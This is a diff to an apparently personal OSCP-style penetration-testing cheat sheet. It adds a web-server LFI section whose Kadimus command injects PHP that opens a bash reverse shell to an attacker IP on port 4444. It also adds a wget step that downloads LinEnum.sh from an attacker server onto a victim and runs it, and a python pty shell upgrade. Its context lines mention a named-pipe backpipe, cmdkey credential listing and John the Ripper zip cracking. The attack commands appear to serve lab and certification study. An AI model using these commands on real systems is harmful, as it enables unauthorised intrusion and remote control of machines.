@@ -1,4 +1,4 @@
- ___  ___  ___ _ __     ___| |__   ___  __ _| |_   ___| |__   ___  ___| |_ 
+ ___  __  ___ _ __     ___| |__   ___  __ _| |_   ___| |__   ___  ___| |_ 
  / _ \/ __|/ __| '_ \   / __| '_ \ / _ \/ _` | __| / __| '_ \ / _ \/ _ \ __|
 | (_) \__ \ (__| |_) | | (__| | | |  __/ (_| | |_  \__ \ | | |  __/  __/ |_ 
  \___/|___/\___| .__/   \___|_| |_|\___|\__,_|\__| |___/_| |_|\___|\___|\__|
@@ -161,6 +161,14 @@ mknod /tmp/backpipe p
 #sweeeeet!
 
 
+##############################WEB SERVER LFI##############################
+
+#tools to help
+#Kadimus
+#https://github.com/P0cL4bs/Kadimus
+#remember to install dependancies
+./kadimus -t https://[target]/section.php?page=php://input%00 -C \ '<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.xxx/4444 0>&1 2>&1"); ?>' -X input
+
 ###################LINUX ENUMERATION#################################
 #ok so ideally use a tool such as linenum.sh however we need to know what to do manualy.
 #so first thing is first let's see who I am?
@@ -210,8 +218,13 @@ cmdkey /list
 
 ######### LINUX POST EXPLOITATION ##############
 # on linux and unix systems BASH shell scripts can be useful after an initial shell has been achieved
-LinEnum.sh
 
+
+#setup a python web server on attacker
+#dowload LinEnum.sh from attacker to victim
+wget http://10.11.0.90/LinEnum.sh
+#execute LinEnum.sh
+./LinEnum.sh
 #######################################################################################
 #######################################################################################
 ################################## CRACKING ###########################################
@@ -222,5 +235,11 @@ LinEnum.sh
 zip2john control.zip > ziphash
 #next we need to run john and specify the format and the hash file and provide a wordlist
 john --format=zip --wordlist=passwords.txt ziphash
+
+#########################SHELL UPGRDES###########################
+# if you have a limited shell on linux try this:
+#PYTHON shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
 
 
